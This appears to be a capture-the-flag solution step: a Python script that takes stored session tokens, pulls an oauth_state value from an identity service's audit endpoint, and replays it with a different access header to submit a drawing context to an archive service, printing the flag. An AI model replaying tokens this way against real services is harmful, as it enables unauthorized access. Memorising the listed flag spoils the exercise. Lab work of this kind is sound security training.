Use planner-handover token from W04.3. Submit drawing context to archive service.

```python
import json, ssl, urllib.request, pathlib

ctx = ssl.create_default_context(cafile="/tmp/arwc-ca.crt")
sess = pathlib.Path("handover/corporate-session").read_text().strip()
planning = pathlib.Path("receipts/planner-handover").read_text().strip()
limited = pathlib.Path("receipts/limited-session").read_text().strip()

# W06.1: get oauth_state
h1 = {"Authorization": "Bearer " + sess, "X-ARWC-Tenant": "arwc",
      "X-ARWC-Planning-Access": limited}
d1 = json.loads(urllib.request.urlopen(
    urllib.request.Request("https://corporate-identity.arwc.test/api/sessions/current/audit", headers=h1),
    context=ctx).read())
oauth_state = d1["record"]["oauth_state"]

# W06.2: submit drawing context
h = {"Authorization": "Bearer " + sess, "X-ARWC-Tenant": "arwc",
     "X-ARWC-Planning-Access": planning, "Content-Type": "application/json"}
body = json.dumps({
    "drawing": "DRW-OG2-R8",
    "review": "REV-CRR-4417",
    "oauth_state": oauth_state,
    "preview_origin": "https://preview-cinder.arwc.test",
}).encode()
d = json.loads(urllib.request.urlopen(
    urllib.request.Request("https://retained-archive.arwc.test/api/drawing-contexts",
                            data=body, headers=h, method="POST"), context=ctx).read())
print("record_id:", d["record"]["record_id"])   # RENDER-CRR-882
print("flag:", d["flag"])                        # FLAG{ae7bb9411e4f18dc}
```

Flag: `FLAG{ae7bb9411e4f18dc}` in the top-level `flag` field.
